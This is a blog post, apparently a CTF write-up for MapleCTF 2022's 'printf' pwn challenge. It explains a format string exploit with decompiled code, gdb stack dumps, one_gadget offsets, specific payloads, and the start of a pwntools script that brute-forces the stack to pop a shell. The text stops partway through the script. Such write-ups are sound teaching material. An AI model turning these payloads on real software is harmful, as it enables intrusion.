<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>MapleCTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="MapleCTF 2022">
  <meta name="twitter:description" content="Writeup for MapleCTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/maplectf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="MapleCTF 2022">
  <meta property="og:description" content="Writeup for MapleCTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-08-29T11:23:48+07:00">
    <meta property="article:modified_time" content="2023-02-23T18:03:33+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="MapleCTF">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Format String">
    <meta property="article:tag" content="Shellcode">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/maplectf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/google-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "MapleCTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/maplectf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, MapleCTF, pwn, format string, shellcode","wordcount":  4582 ,
        "url": "https:\/\/chovid99.github.io\/posts\/maplectf-2022\/","datePublished": "2022-08-29T11:23:48+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MapleCTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Aug 29, 2022">Aug 29, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4582 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;22 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#printf">printf</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#exploitation-plan">Exploitation Plan</a></li>
            <li><a href="#solution">Solution</a></li>
          </ul>
        </li>
        <li><a href="#puzzling-oversight">Puzzling Oversight</a>
          <ul>
            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
            <li><a href="#exploitation-plan-1">Exploitation Plan</a></li>
            <li><a href="#solution-1">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/EMRrBNC.png"
        data-srcset="https://i.imgur.com/EMRrBNC.png, https://i.imgur.com/EMRrBNC.png 1.5x, https://i.imgur.com/EMRrBNC.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/EMRrBNC.png"
        title="https://i.imgur.com/EMRrBNC.png" /></p>
<p>During this weekend, I played MapleCTF 2022 with my team <code>idek</code>. We managed to secure the 5th position on this CTF. Here is my write-up for some challenges that I solved during the CTF.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="printf">printf</h2>
<p>On this challenge, we were given a binary called <code>chal</code>.</p>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>Let&rsquo;s start by checking the binary via <code>checksec</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the binary is PIE and Full RELRO. Now, let&rsquo;s try to analyze the binary by disassembling it.</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">alarm</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ready</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ready</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ready</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">set</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>set</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">set</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">go</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>go</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">go</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">extraout_var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">CONCAT44</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">iVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah, okay looking at the <code>go()</code> method, there is a format string bug. But that&rsquo;s it, we don&rsquo;t have any leak (which we need), and yet we were only given one chance to do the format string.</p>
<h3 id="exploitation-plan">Exploitation Plan</h3>
<p>Let&rsquo;s start by trying to check the stack just before we call the <code>printf</code> method by gdb.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/QXn5Q5E.png"
        data-srcset="https://i.imgur.com/QXn5Q5E.png, https://i.imgur.com/QXn5Q5E.png 1.5x, https://i.imgur.com/QXn5Q5E.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/QXn5Q5E.png"
        title="https://i.imgur.com/QXn5Q5E.png" /></p>
<p>We can see some interesting values here. The stack contains a libc address (to be precise <code>__libc_start_main+243</code>), and the stack address itself (We can see saved <code>rbp</code> of method <code>go()</code>, <code>set()</code>, and <code>ready()</code>).</p>
<p>Our target is to pop a shell with the format string bug, and one <code>printf</code> won&rsquo;t be enough for us. So, the plan is:</p>
<ul>
<li>Thinking about how to send our input and call <code>printf</code> multiple times, so that we will be more versatile on the exploit</li>
<li>Try to leak the libc base address, and then calculate the <code>execve</code> address (via one_gadget).</li>
<li>Overwrite one of the saved return pointers to the calculated address, so that it will pop a shell.</li>
</ul>
<h3 id="solution">Solution</h3>
<p>To execute our plan, let&rsquo;s try to use <code>one_gadget</code> first. I did a little bit of guessing, where based on the previous challenge called <code>warmup2</code>, I guessed that the libc version will be the same as my local (Ubuntu 20.04). So let&rsquo;s try to do <code>one_gadget</code> on it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="s1">&#39;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mh">0xe3afe</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">r12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r15</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r15</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r12</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r12</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mh">0xe3b01</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">rdx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r15</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r15</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rdx</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rdx</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mh">0xe3b04</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rsi</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rsi</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rdx</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rdx</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I&rsquo;ll use the <code>0xe3b01</code> as the offset of our pop shell address, because based on observation in GDB, the r15 and rdx will be null, so it has fulfilled the constraints.</p>
<p>Now, we know that:</p>
<ul>
<li>Via format string, we can leak the libc base address</li>
<li>We have the gadget address of <code>execve</code>, which means we know the value that we need to write to one of the saved return pointers</li>
</ul>
<p>Let&rsquo;s try to check the stack layout</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  tele
</span></span><span class="line"><span class="cl">0x007fffffffdbc0│+0x0000: 0x007fffffffdbd0  →  0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000	 ← $rsp, $rbp
</span></span><span class="line"><span class="cl">0x007fffffffdbc8│+0x0008: 0x005555555551f2  →  &lt;set+18&gt; nop 
</span></span><span class="line"><span class="cl">0x007fffffffdbd0│+0x0010: 0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdbd8│+0x0018: 0x00555555555207  →  &lt;ready+18&gt; nop 
</span></span><span class="line"><span class="cl">0x007fffffffdbe0│+0x0020: 0x007fffffffdbf0  →  0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdbe8│+0x0028: 0x0055555555524e  →  &lt;main+68&gt; mov eax, 0x0
</span></span><span class="line"><span class="cl">0x007fffffffdbf0│+0x0030: 0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdbf8│+0x0038: 0x007ffff7ddd083  →  &lt;__libc_start_main+243&gt; mov edi, eax
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the stack value in <code>0x007fffffffdbf8</code> is already pointing to the libc region. So, it is clear that we can just overwrite the last 3 bytes of the stored value with our calculated gadget address, but to do it, we need a way to repeat the <code>go()</code> method multiple times, so that we can overwrite the saved return pointer with our desired value.</p>
<p>The idea is that the saved rbp of <code>set()</code>, which is located in the <code>0x007fffffffdbd0</code> is pointing to another stack address <code>0x007fffffffdbe0</code>. If we&rsquo;re able to overwrite the value stored in <code>0x007fffffffdbe0</code> with our desired address, we will be able to use it as our gadget to overwrite the stored pointer. For example:</p>
<ul>
<li>With format string attack, we overwrite the LSB of the value pointed by <code>0x007fffffffdbd0</code> with <code>0xc8</code>. That means the stored value inside <code>0x007fffffffdbe0</code> will be changed from <code>0x007fffffffdbf0</code> to <code>0x007fffffffdbc8</code>. Now, it points to the saved return pointer of the <code>go()</code> method.</li>
<li>And then using the format string attack again, if we overwrite the LSB of the value pointed by <code>0x007fffffffdbe0</code>, that means the value stored inside <code>0x007fffffffdbc8</code> will be overwritten, which means we now control our program execution flow.</li>
</ul>
<p>So, based on the above example, it is clear that the goal of our first format string loop is:</p>
<ul>
<li>Overwrite the 8th param <strong>pointed</strong> address last byte with <code>0xc8</code> (8th param is <code>0x007fffffffdbd0</code>, pointing to <code>0x007fffffffdbe0</code>, so what we overwrite is the value stored inside <code>0x007fffffffdbe0</code>).</li>
<li>After that, overwrite the 10th param <strong>pointed</strong> address last byte with <code>0xed</code>(10th param is <code>0x007fffffffdbe0</code>, which due to the first payload, is now pointing to the saved return pointer of <code>go()</code> :D). Now, the <code>go()</code> will return to <code>set()</code> and the <code>set()</code> will call <code>go()</code> again. We successfully create the loop.</li>
<li>Also, don&rsquo;t forget to leak the libc address and stack address as well in the first payload.</li>
</ul>
<p>So, the first loop payload is <code>%c%c%c%c%c%c%50x%hhn%181x%hhn||%6$p.%7$p.%13$p</code>. One of the important note is that, if we want to do a chain overwrite like this, we aren&rsquo;t allowed to use any positional parameter at the beginning of it, because when <code>printf</code> see the first positional argument, it will copy the needed arguments to its buffer, so that we won&rsquo;t be able to do the chain because the next positional argument will refer to the copied buffer, not the overwritten value.</p>
<p>For example, if we&rsquo;re not spamming <code>%c</code>, and instead do it like <code>%56x%8$n%181x%10$n</code>, when we try to overwrite the pointed value by the 10th param, it will still refer to the old value (not the overwritten value from the first positional arguments) due to the copy logic.</p>
<p>You must be wondering why we overwrite the 8th param last byte with <code>0xc8</code>. Isn&rsquo;t there an ASLR that always randomizes the stack address? Well, that&rsquo;s true, but because we only guess the last byte, and the last byte will most likely end with <code>0x8</code>, the probability that it is correct is 1:16, which means brute-forcing is very possible.</p>
<p>So, the idea is we need to brute-force it by connecting to the remote server multiple times, with chance 1:16 that the last byte of the stack address which stored the saved return pointer of <code>go()</code> method is indeed <code>0xc8</code> or any value that we want (Later on my script, I choose <code>0x38</code> as my lucky number during guessing the LSB of the stack).</p>
<p>Now that we&rsquo;re able to trigger the loop, the second format string loop would be used to:</p>
<ul>
<li>Overwrite the 10th param last byte with <code>0xed</code> again, so that the <code>go()</code> will be looped again. Notes that the 10th param is our crafted gadget from the previous loop.</li>
<li>Overwrite the 6th param <strong>pointed</strong> address last byte with <code>0xf8</code>, so that the 8th param will point to <code>0x007fffffffdbf8</code> instead of <code>0x007fffffffdbe0</code>.</li>
<li>Overwrite the 8th param <strong>pointed</strong> address two last bytes with our two last bytes of the calculated win address (8th param is pointing to the saved return pointer of <code>main()</code> method which is stored in <code>0x007fffffffdbf8</code>).</li>
</ul>
<p>The second payload will be <code>%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn</code>.</p>
<p>Now, on the final loop, the last format string loop would be used to:</p>
<ul>
<li>Overwrite the 6th param <strong>pointed</strong> address last byte with <code>0xf8+2</code>, so that the 8th param will point to <code>0x007fffffffdbfa</code> instead of <code>0x007fffffffdbe0</code>. We&rsquo;re trying to overwrite the third last byte.</li>
<li>Overwrite the 8th param <strong>pointed</strong> address last bytes with our third LSB of the calculated win address.</li>
</ul>
<p>The final payload will be <code>%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn</code>. Because we didn&rsquo;t overwrite the saved return pointer of <code>go()</code>, after the <code>printf</code> got executed, it will continue the normal flow, and when the <code>main()</code> method is returned, it will return to the shell.</p>
<p>Full script</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chal&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./chal&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">            b *go+47
</span></span></span><span class="line"><span class="cl"><span class="s1">            &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;printf.ctf.maplebacon.org&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Assuming that the address of the return pointer of go() LSB is 0x38</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># For local testing, turn off ASLR to make it easier to test</span>
</span></span><span class="line"><span class="cl">    <span class="n">bruteforce_stack_lsb</span> <span class="o">=</span> <span class="mh">0x38</span>
</span></span><span class="line"><span class="cl">
